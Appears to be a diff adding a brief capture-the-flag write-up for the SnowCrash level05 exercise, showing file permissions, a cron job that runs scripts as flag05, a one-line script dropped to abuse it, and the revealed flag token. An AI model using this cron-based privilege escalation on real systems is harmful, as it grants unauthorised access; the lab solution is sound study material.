@@ -1,0 +1,24 @@
+getfacl: Removing leading '/' from absolute path names
+# file: usr/sbin/openarenaserver
+# owner: flag05
+# group: flag05
+user::rwx
+user:level05:r--
+group::r-x
+mask::r-x
+other::---
+
+
+level05@SnowCrash:/opt/openarenaserver$ sh /usr/sbin/openarenaserver 
++ getflag
+Check flag.Here is your token :
+Nope there is no token here for you sorry. Try again :)
+
+
+*/2 * * ** su -c "sh /usr/sbin/openarenaserver" - flag05 --> CRON SCRIPT!!!!
+
+level05@SnowCrash:/opt/openarenaserver$ echo "getflag > /tmp/res" > script
+level05@SnowCrash:/opt/openarenaserver$ cat /tmp/res
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+level05@SnowCrash:/opt/openarenaserver$ 
+
